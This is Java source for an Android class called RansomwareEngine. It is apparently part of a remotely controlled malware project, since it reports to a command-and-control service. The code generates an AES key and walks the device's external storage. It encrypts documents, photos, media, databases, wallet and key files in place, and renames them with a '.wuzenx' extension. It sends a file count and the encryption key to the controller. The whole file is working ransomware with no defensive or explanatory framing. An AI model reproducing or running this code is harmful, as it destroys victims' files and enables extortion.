package com.wuzenx.engine;

import android.content.Context;
import android.os.Environment;
import com.wuzenx.C2Service;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.security.SecureRandom;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

public class RansomwareEngine {
    private Context context;
    private C2Service c2;
    private byte[] key = new byte[16];
    private boolean active = false;

    public RansomwareEngine(Context context, C2Service c2) { this.context = context; this.c2 = c2; }

    public void encryptFiles() {
        active = true;
        new SecureRandom().nextBytes(key);
        c2.sendMessage("log", "Ransomware: encrypting files...");
        
        File root = Environment.getExternalStorageDirectory();
        encryptDir(root);
        
        c2.sendMessage("log", "Ransomware: " + count + " files encrypted. Key: " + 
            android.util.Base64.encodeToString(key, android.util.Base64.NO_WRAP));
        active = false;
    }

    private int count = 0;
    
    private void encryptDir(File dir) {
        if (!active || count > 200) return;
        File[] files = dir.listFiles();
        if (files == null) return;
        
        String[] extensions = {".doc", ".docx", ".pdf", ".xls", ".xlsx", ".ppt", ".pptx",
            ".jpg", ".jpeg", ".png", ".bmp", ".gif", ".txt", ".rtf", ".csv",
            ".zip", ".rar", ".7z", ".mp3", ".mp4", ".avi", ".mkv",
            ".db", ".sql", ".sqlite", ".wallet", ".dat", ".key", ".json"};
        
        for (File f : files) {
            if (count > 200) return;
            if (f.isDirectory()) {
                if (!f.getName().startsWith(".") && !f.getName().equals("Android"))
                    encryptDir(f);
            } else {
                String name = f.getName().toLowerCase();
                for (String ext : extensions) {
                    if (name.endsWith(ext)) {
                        try {
                            encryptFile(f);
                            count++;
                        } catch (Exception ignored) {}
                        break;
                    }
                }
            }
        }
    }

    private void encryptFile(File file) throws Exception {
        FileInputStream fis = new FileInputStream(file);
        byte[] data = new byte[(int) file.length()];
        fis.read(data);
        fis.close();
        
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(key, "AES"));
        byte[] encrypted = cipher.doFinal(data);
        
        FileOutputStream fos = new FileOutputStream(file);
        fos.write(encrypted);
        fos.close();
        
        file.renameTo(new File(file.getAbsolutePath() + ".wuzenx"));
    }
}
